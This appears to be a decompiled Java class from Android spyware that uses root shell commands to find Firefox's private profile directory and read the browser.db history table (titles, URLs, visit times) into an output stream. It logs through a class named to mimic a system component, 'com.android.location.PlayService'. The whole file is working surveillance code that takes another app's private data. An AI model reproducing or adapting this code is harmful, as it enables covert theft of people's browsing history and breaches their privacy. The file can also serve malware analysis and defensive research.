package ru.dtlbox.databasereader;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.android.location.PlayService;
import java.io.IOException;
import java.io.OutputStream;

public class FirefoxHistoryReader
  extends BaseBrowserHistoryReader
{
  private static final byte BROWSERHISTORY = 114;
  private static final String[] CURRENT_COLUMNS = { "_id", "title", "url", "date" };
  private static final String CURRENT_TABLE = "history";
  private static final int INDEX_OF_ID = 0;
  private static final int INDEX_OF_LAST_VISIT_TIME = 3;
  private static final int INDEX_OF_TITLE = 1;
  private static final int INDEX_OF_URL = 2;
  private static String SOURCE_DB = "/data/data/org.mozilla.firefox/files/mozilla/k8bu0l10.default/browser.db";
  private static final String SOURCE_DB_NAME = "browser.db";
  private static final String USING_DB_NAME = "firefox.sqlite";
  
  public FirefoxHistoryReader(Config paramConfig)
  {
    initPath();
    init(paramConfig, SOURCE_DB, "firefox.sqlite");
  }
  
  private void initPath()
  {
    String str = new CandidateFinder(RootCommand.twoCommandSUforResult("cd /data/data/org.mozilla.firefox/files/mozilla/\n", "ls\n").split("\n")).getCandidate();
    if (str != null) {
      SOURCE_DB = "/data/data/org.mozilla.firefox/files/mozilla/" + str + "/browser.db";
    }
  }
  
  public int read(OutputStream paramOutputStream, int paramInt)
    throws IOException
  {
    PlayService.FLOG("reading Firefox from " + paramInt);
    int j = 0;
    this.mDataBaseHelper.opendatabase();
    Cursor localCursor = this.mDataBaseHelper.getDataBase().query("history", CURRENT_COLUMNS, "_id > " + String.valueOf(paramInt), null, null, null, null);
    int i = paramInt;
    PlayService.FLOG("reading Firefox cc = " + localCursor.getCount());
    if (localCursor.getCount() == 0) {
      return paramInt;
    }
    paramOutputStream.write(114);
    paramInt = j;
    for (;;)
    {
      if ((!localCursor.moveToNext()) || (paramInt >= this.count))
      {
        paramOutputStream.write(2);
        this.mDataBaseHelper.close();
        PlayService.FLOG("Firefox finished ok " + i);
        return i;
      }
      i = localCursor.getInt(0);
      addData(paramOutputStream, String.valueOf(localCursor.getLong(3) / 1000L));
      addData(paramOutputStream, localCursor.getString(1));
      addData(paramOutputStream, localCursor.getString(2));
      paramOutputStream.write(3);
      paramInt += 1;
    }
  }
  
  private class CandidateFinder
  {
    String[] from;
    
    public CandidateFinder(String[] paramArrayOfString)
    {
      this.from = paramArrayOfString;
    }
    
    private boolean checkCandidate(String paramString)
    {
      paramString = RootCommand.twoCommandSUforResult("cd /data/data/org.mozilla.firefox/files/mozilla/" + paramString + "/\n", "ls\n").split("\n");
      int j = paramString.length;
      int i = 0;
      for (;;)
      {
        if (i >= j) {
          return false;
        }
        if (paramString[i].equals("browser.db")) {
          return true;
        }
        i += 1;
      }
    }
    
    public String getCandidate()
    {
      String[] arrayOfString = this.from;
      int j = arrayOfString.length;
      int i = 0;
      for (;;)
      {
        Object localObject;
        if (i >= j) {
          localObject = null;
        }
        String str;
        do
        {
          return localObject;
          str = arrayOfString[i];
          if ((str.equals("Crash Reports")) || (str.equals("webapps")) || (str.equals("profiles.ini"))) {
            break;
          }
          localObject = str;
        } while (checkCandidate(str));
        i += 1;
      }
    }
  }
}
